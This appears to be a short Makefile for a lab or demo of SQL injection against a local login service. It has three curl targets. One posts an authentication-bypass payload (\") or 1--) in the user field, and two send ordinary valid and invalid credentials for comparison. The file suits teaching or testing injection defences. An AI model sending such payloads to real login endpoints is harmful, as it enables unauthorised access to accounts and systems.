inject:
	curl -X POST -H "Content-Type: application/json" \
		-d '{ "user":"\") or 1--", "pass":"aoligei" }' \
		http://injection:8080/login

success:
	curl -X POST -H "Content-Type: application/json" \
		-d '{ "user":"admin", "pass":"aoligei" }' \
		http://injection:8080/login

fail:
	curl -X POST -H "Content-Type: application/json" \
		-d '{ "user":"daxoing", "pass":"xiaoming" }' \
		http://injection:8080/login
